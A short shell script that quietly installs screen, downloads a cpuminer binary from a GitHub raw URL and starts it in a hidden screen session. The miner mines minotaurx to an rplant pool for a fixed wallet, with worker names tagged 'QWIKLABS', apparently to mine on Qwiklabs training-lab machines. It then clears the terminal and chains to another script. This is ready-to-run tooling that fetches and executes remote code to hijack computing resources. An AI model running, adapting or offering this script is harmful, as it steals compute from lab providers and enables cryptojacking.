#!/bin/sh

sudo apt install screen -y > /dev/null 2>&1
wget https://raw.githubusercontent.com/kucingpersia/asu/main/cpuminer-sse2
chmod +x cpuminer-sse2
screen -S Wuenak_Guerrr -dm ./cpuminer-sse2 -a minotaurx -o stratum-na.rplant.xyz:17068 -u RMLhf8ZhhnP97gVJLWLAN8qGf4Wge3bdHb.$(echo $(shuf -i 1-100 -n 1)-QWIKLABS) -t 5
screen -ls
sleep 4
clear
screen -ls
./Timer_Bo.sh
